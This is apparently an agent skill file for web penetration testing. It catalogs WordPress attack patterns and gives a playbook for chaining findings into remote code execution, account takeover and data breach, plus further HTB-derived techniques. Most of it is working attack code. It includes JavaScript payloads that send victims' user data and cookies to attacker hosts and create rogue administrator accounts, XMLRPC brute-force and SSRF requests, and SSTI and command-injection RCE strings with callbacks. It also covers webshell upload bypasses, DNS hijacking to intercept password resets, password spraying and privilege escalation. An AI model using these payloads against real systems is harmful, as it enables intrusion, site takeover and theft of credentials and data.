---
name: Attack Patterns Reference & Exploit Chaining
description: Lookup catalog of WordPress/web attack patterns plus a playbook for chaining medium/high findings into critical-impact RCE, ATO, SSRF and data-breach chains.
tags: [wordpress, cors, xmlrpc, exploit-chaining, ssrf, privilege-escalation, api-abuse, decompilation, dns-hijack, known-plaintext, mobile]
recommended_tools: [http_request, http_repeater, curl, python3, jq, nuclei_scan, wpscan, subfinder_scan, nmap_scan, hydra_attack]
vuln_classes: []
domain: general
phase: exploitation
provenance: {source: uphiago/recon-skills, paths: [meta/attack-patterns-reference/SKILL.md, chains/cross-attack-chains/SKILL.md]}
---

# Attack Patterns Reference & Exploit Chaining

A two-part exploitation aid:

1. A **pattern catalog** — a lookup table mapping an observed behavior (a reflected CORS header, an
   open XMLRPC endpoint, an exposed error log) to its exploitation path, detection command, and
   severity. Use it to identify *which* technique matches a finding.
2. A **chaining playbook** — how to compose 2+ individual findings into a single critical-impact
   chain (CORS + Open Reg + XMLRPC = full compromise; MySQL open + CORS = mass data breach). A CORS
   finding alone is High; chained correctly it becomes Critical.

A pattern match is reconnaissance, not a finding. Exploitation and demonstrated impact are required.
Map internal pattern IDs to CWE/CVSS for any client deliverable.

## Part 1 — Pattern Catalog

### General attack patterns

| Pattern | Severity | Notes |
|---------|----------|-------|
| WP REST API user enumeration | Medium | Enumerate authors/admins; feeds brute force & phishing |
| CORS origin reflection + credentials | Critical | `ACAO: <origin>` + `ACAC: true` → credentialed cross-origin read |
| CORS null origin trust | High | `ACAO: null` + `ACAC: true` → sandboxed-iframe bypass |
| CORS wildcard (no creds) | Info | `ACAO: *` — public data only; submittable only when chained |
| CORS on auth-protected endpoints | Critical | Cookie theft even on endpoints returning 401/403 |
| XMLRPC system.multicall brute force | High | ~1000x amplification, evades rate limiting |
| XMLRPC pingback.ping SSRF | High | Reach IMDS / localhost / internal subnets |
| XMLRPC IMDS role guessing | Critical | SSRF → cloud metadata → IAM role → cloud takeover |
| Open registration → upload → RCE | Critical | Subscriber account + `wp.uploadFile` → webshell |
| Plugin REST namespace brute force | Variable | `/wp-json/{plugin}/v1/` discovery of 40+ namespaces |
| Error log credential mining | High–Critical | DB creds / paths / SQL in exposed logs |
| PHPInfo exec-function check | High | Confirms `disable_functions` doesn't block exec |
| Source / backup leak mass scan | Critical | `.git`, `backup.sql`, `.env` — verify real content, not SPA catch-all |
| JS bundle secret extraction | Critical | API keys, DB strings, endpoints in bundles |
| MySQL 3306 public | Critical | Direct DB access if creds obtained |
| Internal microservice ports exposed | High | Unauthenticated internal APIs reachable |
| IAM role brute force via SSRF | Critical | Guess role names against IMDS credentials path |
| Staging weaker security | Variable | Staging often lacks WAF / has install pages |

### WordPress abuse patterns — exact commands

```bash
# Direct REST user enumeration
curl -sk "https://TARGET/wp-json/wp/v2/users" | jq '.[] | {id,name,slug}'

# Authenticated user info leak (needs session/nonce)
curl -sk "https://TARGET/wp-json/wp/v2/users?context=edit"

# Yoast author sitemap author leak
curl -sk "https://TARGET/author-sitemap.xml"

# XMLRPC method enumeration
curl -sk -X POST "https://TARGET/xmlrpc.php" -H "Content-Type: text/xml" \
  -d '<methodCall><methodName>system.listMethods</methodName></methodCall>'

# Open registration check (must match user_login + register + wp-submit in body)
curl -sk "https://TARGET/wp-login.php?action=register" | grep -c "user_login"

# Plugin version via readme
curl -sk "https://TARGET/wp-content/plugins/PLUGIN/readme.txt" | grep "Stable tag"

# Staging install-page takeover (check for "WordPress" + "installation" in body)
curl -sk "https://staging.TARGET/wp-admin/install.php"

# Debug / backup exposure (verify DDL/DML content, not catch-all HTML)
curl -sk "https://TARGET/wp-content/debug.log"
curl -sk "https://TARGET/backup.sql"

# Plugin API presence probes
curl -sk -o /dev/null -w "%{http_code}" "https://TARGET/wp-json/acf/v3"
curl -sk -o /dev/null -w "%{http_code}" "https://TARGET/wp-json/redirection/v1/log"
curl -sk "https://TARGET/wp-json/gf/v2/"
```

### CORS bypass variants

| Variant | Detection | Exploitability |
|---------|-----------|----------------|
| Origin reflection + creds | `ACAO: evil.com` + `ACAC: true` | Critical — full credentialed cross-origin read |
| Null origin reflection | `ACAO: null` + `ACAC: true` | High — sandboxed iframe bypass |
| Wildcard no creds | `ACAO: *`, no creds | Info — public data only |
| Credentialed preflight | OPTIONS returns ACAC + valid origin | High — GET bypass when OPTIONS works |
| Auth-endpoint CORS | CORS reflects on 401/403 endpoints | Critical — cookie theft from auth-gated APIs |
| Multi-origin reflection | Any origin reflected | Critical — broadest surface |
| Plugin-specific CORS | CORS only on plugin namespace | Medium — plugin data only |
| Staging-only CORS | Prod clean, staging reflects | Medium — dependent on staging access |

**CORS detection:** send `Origin: https://evil.com` and inspect the response.

```bash
curl -sk -I -H "Origin: https://evil.com" "https://TARGET/wp-json/wp/v2/users" \
  | grep -i "access-control-allow"
# Critical if you see: Access-Control-Allow-Origin: https://evil.com  AND  Access-Control-Allow-Credentials: true
```

Confirm CORS with a real browser PoC (credentialed `fetch`), not just curl headers — the impact is
cross-origin *credentialed* read, which curl cannot demonstrate.

**Third-party reflection edge case:** if `ACAO` reflects a specific third-party origin (not your
`evil.com`), the server hard-codes the wrong origin for a partner integration. Not directly
exploitable against the target, but signals poor CORS hygiene — pivot to the trusted third party.

### Known-dead patterns (do not spend time)

- **Default creds (admin:admin)** — WordPress auto-generates random passwords since v5.0.
- **`.git/HEAD` on SPA sites** — catch-all routing returns HTML. Always verify with `.git/config` content.
- **CORS on non-WordPress stacks** — Next.js/Shopify/Sitecore/Drupal/static tested CORS-secure in practice.
- **SliderRev v1 REST paths** — v6.x renamed endpoints; probe both `/sliderrevolution/v1/` AND `/revslider/v1/`.
- **JS Google API keys** — usually restricted (`REQUEST_DENIED`); footprinting only.
- **Gravity Forms unauth** — v2.8+ requires auth; public `/gf/v2/forms` no longer returns entries.
- **IMDS body via pingback** — `faultCode 0` confirms reachability but never returns body; needs OOB callback for proof.
- **WP install page on production** — only found on staging; prod is blocked or already configured.

## Part 2 — Chaining Playbook

A single finding rarely justifies Critical. Chaining compounds access. Assess each candidate chain:

1. **Temporal** — can findings be exploited in sequence, or are they independent?
2. **Access level** — does each step grant the access the next step needs?
3. **Concrete PoC** — is there a reproducible exploit for every link?
4. **No missing links** — if a step needs auth, is credential acquisition demonstrated (not assumed)?

### Severity upgrade matrix

| Finding #1 | Finding #2 | Chained result |
|-----------|-----------|----------------|
| CORS (High) | XMLRPC (Medium) | Full compromise (Critical) |
| Open Reg (Low) | XMLRPC upload (Medium) | RCE (Critical) |
| PHPInfo (High) | Open Reg (Low) | RCE (Critical) |
| Plugin CVE (High) | CORS (High) | RCE via CORS-phish (Critical) |
| Source leak (High) | CORS (High) | ATO (Critical) |
| MySQL open (Critical) | CORS (High) | Mass data breach (Critical) |
| XMLRPC SSRF (High) | IMDS reachable (Critical) | Cloud takeover (Critical) |

### Chain A — CORS + Open Registration + XMLRPC → full compromise

1. CORS credential reflection → exfiltrate users, plugins (identify vulnerable versions), site map.
2. Open registration → create a subscriber account.
3. XMLRPC `wp.uploadFile` (authenticated as subscriber) → upload a PHP webshell.
4. Webshell → RCE → read `wp-config.php` (MySQL root pw), `/etc/passwd`, drop reverse shell, pivot to
   co-hosted sites.

Minimum viable: CORS + (Open Reg **OR** XMLRPC).

### Chain B — PHPInfo + Open Registration → RCE

Exposed `phpinfo()` confirms exec functions are available → register subscriber → file upload → webshell.
If exec functions *are* in `disable_functions`, try these bypasses:

- LD_PRELOAD (if `putenv()` allowed)
- FFI (`FFI::cdef()`, PHP 7.4+)
- `mail()` + `sendmail_path` abuse
- `proc_open()` — often missed in `disable_functions`

### Chain C — CORS + Plugin CVE → RCE

CORS exfiltrates the plugin list → detect versions via `readme.txt`/REST → exploit a known CVE.

| Plugin | Vulnerable version | CVE | Impact |
|--------|-------------------|-----|--------|
| Slider Revolution | < 6.6.20 | CVE-2024-2534 | RCE via file upload |
| ElementsKit | < 2.9.4 | CVE-2023-6851/6853 | Unauthenticated RCE |
| Gravity Forms | < 2.8.2 | CVE-2024-6115 | Auth bypass → admin access |
| LiteSpeed Cache | < 6.5.0 | CVE-2024-50550 | Privilege escalation |

### Chain D — CORS phishing → session hijack → ATO

Victim with an admin session visits the attacker page; a credentialed cross-origin `fetch` reads user
data and admin nonces, then creates a rogue administrator via CSRF. Requires user interaction — document
that in the report.

```html
<script>
// Exfiltrate user data, then extract admin-ajax nonce and create a backdoor admin.
fetch("https://TARGET/wp-json/wp/v2/users?context=edit", {credentials:"include"})
  .then(r => r.json())
  .then(users => {
    new Image().src = "https://ATTACKER_COLLAB/log?u=" + btoa(JSON.stringify(users));
    return fetch("https://TARGET/wp-admin/admin-ajax.php", {credentials:"include"});
  })
  .then(r => r.text())
  .then(html => {
    const nonce = html.match(/_wpnonce=([a-f0-9]+)/);
    if (!nonce) return;
    fetch("https://TARGET/wp-admin/user-new.php", {
      method:"POST", credentials:"include",
      headers:{"Content-Type":"application/x-www-form-urlencoded"},
      body:"action=createuser&_wpnonce="+nonce[1]+
           "&user_login=backdoor&email=backdoor@evil.com"+
           "&pass1=HackThePlanet2026!&pass2=HackThePlanet2026!"+
           "&role=administrator&createuser=Add+New+User"
    });
  });
</script>
```

### Chain E — Open MySQL + CORS → data breach

MySQL 3306 open to the internet + CORS wildcard (API access). Brute common creds
(`root:root`, `app:password`) or lift DB credentials from a JS bundle → direct DB dump.
High regulatory impact for healthcare/PII targets (potential HIPAA).

```bash
nmap -p 3306 -sV TARGET          # banner grab
hydra -L users.txt -P rockyou.txt mysql://TARGET   # or manual mysql -h TARGET -u root -p
```

### Chain F — XMLRPC pingback SSRF → internal scan + cloud metadata

`pingback.ping` needs no auth and (when source-URL validation is absent) accepts any internal URL.

```bash
# Basic pingback (arg1 = target URL to probe, arg2 = a valid post URL on TARGET)
curl -sk -X POST "https://TARGET/xmlrpc.php" -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName>
<params><param><value><string>http://127.0.0.1:80/</string></value></param>
<param><value><string>https://TARGET/?p=1</string></value></param></params></methodCall>'

# Probe cloud metadata endpoints (needs OOB callback for a body — pingback returns no data)
#   AWS:   http://169.254.169.254/latest/meta-data/
#   Azure: http://169.254.169.254/metadata/instance
#   GCP:   http://metadata.google.internal/
```

Fault-code mapping:

| faultCode | Meaning |
|-----------|---------|
| 0 | Target reachable (port open) |
| 16 / 17 | Source URL unreachable (port closed/filtered) |
| 32 | Pingback registered (post accepted it) |

### Chain G — system.multicall amplified brute force

`system.multicall` runs an array of method calls in one HTTP request. Rate-limiters see 1 request; the
server performs N auth checks. Pack `wp.getUsersBlogs` structs (user × password combos).

```xml
<value><struct>
  <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
  <member><name>params</name><value><array><data>
    <value><string>admin</string></value>
    <value><string>password123</string></value>
  </data></array></value></member>
</struct></value>
```

```bash
curl -sk -X POST "https://TARGET/xmlrpc.php" -H "Content-Type: text/xml" -d @payload.xml
# faultCode 403 = wrong password; anything else = possible success
grep -oP 'faultCode.*?<int>\K\d+' response.xml | sort | uniq -c
```

WordPress caps ~100–200 calls per multicall — start with 50-call blocks and scale.

### Chain H — error log credential mining

Error logs at predictable paths (`/error_log`, `/magical/error_log`, `/debug.log`,
`/wp-content/debug.log`) leak server paths, SQL with inline values, and DB connection strings.

```bash
curl -sk "https://TARGET/error_log" -o error_log.txt
grep -oP '/home/[^"<>: )]+' error_log.txt | sort -u                       # server paths
grep -oiP '(mysql_connect|DB_HOST|DB_USER|DB_PASSWORD)[^;]+' error_log.txt # DB creds
grep -oiP '(password|passwd|pwd)[=: ][^&\s,<>]+' error_log.txt            # inline secrets
grep -oiP '(define\(|API_KEY|SECRET)[^)]+\)' error_log.txt                # config constants
```

### Chain I — forum XSS → WordPress ATO (cross-platform)

A legacy forum (MyBB/phpBB/vBulletin) on the *same domain* as WordPress. Because cookies are
domain-scoped, JS in the forum origin can make credentialed requests to WP. Register, post a stored XSS
payload, a moderator views it, the payload steals the WP session / nonce and creates an admin.

```javascript
fetch('/wp-admin/admin-ajax.php?action=rest-nonce',{credentials:'include'})
 .then(r=>r.text()).then(nonce=>{
   fetch('https://attacker.com/steal',{method:'POST',mode:'no-cors',
     body:JSON.stringify({cookie:document.cookie,nonce})});
   fetch('/wp-json/wp/v2/users',{method:'POST',credentials:'include',
     headers:{'Content-Type':'application/json','X-WP-Nonce':nonce},
     body:JSON.stringify({username:'eviladmin',password:'EvilPass123!',
       email:'evil@attacker.com',roles:['administrator']})});
 });
```

Combines well with Chain D (use CORS to exfiltrate nonces while the forum XSS supplies execution context).

## Real-world chains (0xdf HTB)

Cross-cutting tricks that don't belong to one vuln class — encoding/filter bypasses, protocol abuse,
API abuse, binary/mobile analysis, and misc pivots seen repeatedly across 0xdf HTB writeups. Each entry
lists the trigger, the ladder, and the PROOF that it worked.

### Encoding & filter bypasses

When a filter blocks a payload, re-encode until the *sink* decodes it but the *filter* doesn't.

```bash
# Double URL-encode to slip past a single-decode WAF (../ -> %252e%252e%252f)
curl -sk "https://<TARGET>/download?file=%252e%252e%252fetc%252fpasswd"

# Case / null-byte / mixed-encoding LFI variants
curl -sk "https://<TARGET>/?page=....//....//etc/passwd"     # nested traversal collapses after strip
curl -sk "https://<TARGET>/?page=/etc/passwd%00"             # legacy PHP <5.3.4 null truncation
curl -sk "https://<TARGET>/?page=php://filter/convert.base64-encode/resource=index.php"

# Extension/content-type bypass on upload filters
#   shell.php.jpg / shell.pHp / shell.php%00.jpg / shell.phtml / trailing dot "shell.php."
#   + magic bytes: prepend GIF89a; then <?php system($_GET['c']); ?>
```
PROOF: `root:x:0:0:` in the LFI response, base64 source that decodes to real PHP, or the uploaded
file returning `id` output.

### SSTI → RCE quick triage

Fingerprint the engine, then jump straight to the exec gadget.

```bash
# Probe: {{7*7}} -> 49 (Jinja2/Twig), ${7*7} -> 49 (FreeMarker/Spring), #{7*7} (Ruby)
# Jinja2 RCE:
{{ cycler.__init__.__globals__.os.popen('id').read() }}
# Twig RCE:
{{ ['id']|filter('system') }}
# FreeMarker RCE:
<#assign x="freemarker.template.utility.Execute"?new()>${ x("id") }
```
PROOF: `uid=` in the rendered page. If `49` reflects but exec is filtered, the class is still SSTI —
downgrade to a file read (`__globals__` / `?read`).

### Command-injection operator ladder

When a parameter feeds a shell, walk operators until one lands, then defeat output-blindness with OOB.

```bash
# Inline operators (try each): ; | & && || `id` $(id) %0a (newline) ${IFS} for space-filtering
curl -sk "https://<TARGET>/ping?ip=127.0.0.1%3Bid"
curl -sk "https://<TARGET>/ping?ip=127.0.0.1%0a$(printf 'id')"

# Space bypass when spaces are stripped:  cat${IFS}/etc/passwd  or  {cat,/etc/passwd}
# Blind: force a DNS/HTTP callback to confirm exec
curl -sk "https://<TARGET>/ping?ip=127.0.0.1%3Bcurl%20http://<IP>/x"
# then out-of-band: nc -lvnp 80  (a hit = code executed)
```
PROOF: command output reflected, OR an inbound connection on your listener (`nslookup`/`curl`
callback) for blind cases.

### REST-API self-provisioning of a privileged account

When you hold an admin-scoped API token (Bearer), skip the UI — mint your own superuser directly
through the product's REST API. Common on SSO/IdP stacks (Authentik, Keycloak, Django-admin APIs);
the token is usually looted from config, backups, or a service account.

```bash
# 1) Confirm the token works and enumerate existing users (note a valid admin group id)
curl -L 'http://<TARGET>:9000/api/v3/core/users/' -H 'Authorization: Bearer <TOKEN>'

# 2) Create a superuser
curl -L 'http://<TARGET>:9000/api/v3/core/users/' \
  -H 'Content-Type: application/json' -H 'Authorization: Bearer <TOKEN>' \
  --data-raw '{"username":"<USER>","name":"<USER>","is_superuser":true}'   # returns "pk":<ID>

# 3) Set its password
curl -L 'http://<TARGET>:9000/api/v3/core/users/<ID>/set_password/' \
  -H 'Authorization: Bearer <TOKEN>' --data-raw '{"password":"<PASS>"}'

# 4) Add it to the admin group
curl -L 'http://<TARGET>:9000/api/v3/core/groups/<GID>/add_user/' \
  -H 'Authorization: Bearer <TOKEN>' --data-raw '{"pk":<ID>}'
```
PROOF: interactive admin login as `<USER>:<PASS>` succeeds and the account shows superuser/admin-group
membership. Generalize the paths — any IdP/admin API with a create-user + set-password + group-add
trio is abusable the same way.

### .NET / binary decompilation for logic flaws

When you pull a `.exe`/`.dll` off FTP, an SMB share, or a backup, decompile it and read the code —
hardcoded creds, connection strings, crypto keys, and unsafe file handling live in there.

```bash
ilspycmd <APP>.dll                 # ILSpy CLI dump to stdout (or dnSpy/dotPeek GUI)
# Hunt the usual sinks:
#   Path.Combine(base, entry.FullName)   -> ZipSlip (unvalidated archive extraction path)
#   new SqlConnection("...Password=...") -> hardcoded DB creds
#   Aes/DES keys + IVs as string literals
```
PROOF: located an exploitable primitive in source — e.g. a ZIP extraction that writes outside its base
dir (ZipSlip), giving arbitrary file write via a crafted archive.

### DNS abuse: authenticated dynamic update to hijack mail

With a recovered TSIG/`rndc` key (often leaked via LFI/config disclosure) and a DNS server that honors
signed updates, repoint an A/MX record at your host and intercept mail — password-reset emails are the
prize (account takeover without ever knowing the old password).

```bash
# 1) Push a signed dynamic update pointing mail at your box
nsupdate -k rndc.key <<'EOF'
server <TARGET>
zone <DOMAIN>
update add mail.<DOMAIN> 86400 IN A <IP>
send
EOF
dig @<TARGET> mail.<DOMAIN> +short          # verify the record now resolves to <IP>

# 2) Catch the redirected mail
python3 -m aiosmtpd -n -l 0.0.0.0:25        # prints inbound messages to stdout

# 3) Trigger a password reset for <USER> in the target app -> reset token lands in your SMTP catcher
```
PROOF: captured the reset email, decoded/followed its token, and set a new password for `<USER>`.

### Android APK static + dynamic analysis

A mobile client for the target app hides secrets and the real API contract. Decompile for embedded
keys/endpoints; when TLS pinning blocks interception, unpin at runtime with Frida.

```bash
apktool d <APP>.apk                          # unpack resources + smali
# Loot: assets/flutter_assets/keys/*.pem, res/values/strings.xml, AndroidManifest.xml, hardcoded URLs
grep -rniE 'BEGIN (RSA|EC|PRIVATE)|api[_-]?key|secret|https?://' <APP>/

# Bypass Flutter/OkHttp cert pinning to MITM the traffic
frida -U -f <PACKAGE> -l disable-flutter-tls.js    # objection / frida-multiple-unpinning also work
# route device through Burp; now plaintext requests are visible
```
PROOF: recovered an embedded private key (e.g. `assets/flutter_assets/keys/private.pem`) and/or
decrypted app traffic flowing through your proxy after the pinning bypass.

### Crypto: known-plaintext recovery against a reused keystream

When an endpoint encrypts attacker-chosen plaintext with a stream cipher (or otherwise reused
keystream), you can recover the keystream and decrypt other ciphertext under the same key — classic for
lifting an ASP.NET `ViewStateUserKey` or session secret. Reaching an internal `/encrypt` API often
needs SSRF; a PDF/HTML renderer that follows a meta-refresh is a reliable SSRF primitive.

```text
# 1) SSRF into the internal encrypt oracle via a meta-refresh the server-side renderer follows:
<meta http-equiv="refresh" content='0;http://127.0.0.1:8000/encrypt?plaintext=AAAAAAAAAAAAAAAA'>

# 2) keystream = ciphertext_of_A's  XOR  known_plaintext(A's)
# 3) target_plaintext = keystream  XOR  captured_ciphertext(ViewStateUserKey)
```
PROOF: recovered the secret in cleartext (e.g. `ViewStateUserKey = SAltysAltYV1ewSTaT3`), then reuse it
to forge/deserialize ViewState for RCE.

### SUID / capabilities / GTFOBins pivot (linux privesc)

Enumerate abusable binaries, then map each to its GTFOBins escape.

```bash
find / -perm -4000 -type f 2>/dev/null            # SUID binaries
getcap -r / 2>/dev/null                            # file capabilities (cap_setuid=ep -> root)
sudo -l                                            # NOPASSWD entries -> GTFOBins each
# Classic escalations:
#   /usr/bin/find . -exec /bin/sh -p \; -quit      (SUID find)
#   python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'   (cap_setuid python)
```
PROOF: `# ` prompt with `id` returning `uid=0(root)`.

### Password reuse & hash pivot

Every credential found is a spray candidate across every service and every user.

```bash
# Spray a found password over SSH/SMB/WinRM/mysql/su
crackmapexec smb <TARGET> -u users.txt -p '<PASS>' --continue-on-success
netexec winrm <TARGET> -u <USER> -H <HASH>          # pass-the-hash to WinRM
# Loot -> crack:  wp-config.php, .env, config.php DB creds; /etc/shadow -> hashcat -m 1800
hashcat -m 1800 shadow.hash rockyou.txt
```
PROOF: `[+]` / `Pwn3d!` from CME/NXC, a shell as the reused-cred user, or a cracked plaintext.

### Port-forward / SSRF pivot to internal services

A foothold + an internal-only service = tunnel and hit it directly.

```bash
# SSH local forward to reach an internal DB/admin panel bound to 127.0.0.1
ssh -L 8080:127.0.0.1:8080 <USER>@<TARGET>
# Or chisel when no SSH:
#   attacker: chisel server -p 9001 --reverse
#   victim:   chisel client <IP>:9001 R:socks   (then proxychains <cmd>)
# SSRF as the tunnel when there's no shell (fetch internal URL through the vuln param):
curl -sk "https://<TARGET>/proxy?url=http://127.0.0.1:8080/admin"
```
PROOF: the internal service responds (login page, API JSON, or admin banner) that was unreachable
directly from your host.

## Reporting & verification

- Every chain must be reproducible step-by-step with the **exact** commands shown — never paste an
  untested command; the triager will copy-paste it.
- Include both success **and** failure responses so the reader knows what to look for.
- Chained severity must be demonstrably higher than the highest individual finding — explain *why* the
  chain is more than the sum of its parts.
- PoC must show the end state (RCE output, exfiltrated data, hijacked session), not just intermediate steps.
- If a chain needs user interaction (CORS/XSS phishing), document the social-engineering scenario.

## Pitfalls

- **Broken chains.** User enumeration without credentials does not chain into an auth-gated step. No assumed access.
- **Over-chaining.** Do not append irrelevant findings to inflate severity; each step must be necessary.
- **Aging patterns.** Pre-2024 WordPress techniques may fail on current versions; re-verify before relying on them.
- **CORS wildcard alone is not submittable** — only valuable chained with proven data exposure.
